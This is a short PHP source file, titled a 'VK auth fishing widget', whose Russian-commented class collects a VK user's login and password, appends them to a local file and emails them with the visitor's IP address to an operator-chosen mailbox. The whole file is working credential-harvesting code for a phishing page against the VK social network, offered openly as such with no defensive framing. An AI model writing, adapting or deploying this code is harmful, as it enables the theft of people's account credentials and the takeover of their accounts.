<?php
/*
 * @author: d32ds3c (ADM1N)
 * @name: VK auth fishing widget
 * @spcl: https://vk.com/bite_owl
 */

class SaveMeNow
{
    //Создаем приватные переменные с логином и паролем.
    private $email = "";
    private $pass = "";

    //Конструктор класса. Передаём им емайл и пароль.
    //$email - e-mail
    //$pass - Пароль
    public function __construct($email, $pass)
    {
        $this->email = $email;
        $this->pass = $pass;
    }

    //Метод сохранения в файл.
    //$filename - путь к файлу, куда сохранять. Если этого файла нет на диске - он будет создан.
    //Метод возращает true в случае успеха или же ошибку в случае неудачи.
    public function toFile($filename)
    {
        try{
            file_put_contents($filename, "телефон: ".$this->email." \n"."пароль: ".$this->pass." \n*****\n", FILE_APPEND);
            return true;
        }
        catch (Exception $ex){
            return $ex->getMessage();
        }
    }

    //Метод отправки данных по e-mail.
    //$email - E-mail, куда отправить.
    //В случае удачи возращает true, в пртивном случае - false;
    public function sendToMail($mail)
    {
        $charset = 'utf-8';
        mb_language("ru");
        $headers  = "MIME-Version: 1.0 \n" ;
        $headers .= "From: <'{$_SERVER["REMOTE_ADDR"]}'> \n";
        $headers .= "Reply-To: <'$mail'> \n";
        $headers .= "Content-Type: text/html; charset=$charset \n";

        $subject = '=?'.$charset.'?B?'.base64_encode('login and pass: '.$_SERVER["REMOTE_ADDR"]).'?=';

        return mail($mail, $subject, 'Номер: '.$this->email.' пароль: '.$this->pass, $headers) ? true : false;
    }

    //Метод, который объеденил два предыдущих метода.
    //$filename - путь к файлу, куда сохранять. Если этого файла нет на диске - он будет создан.
    //$email - E-mail, куда отправить.
    //Возращает true в случае удачи, в случае неудачи - ошибку или исключение.
    public function Save($filename, $mail)
    {
        try{
            if ($this->toFile($filename) === true && $this->sendToMail($mail) === true) return true;
            else throw new Exception("false");
        }
        catch (Exception $ex){
            return $ex->getMessage();
        }
    }
}
?>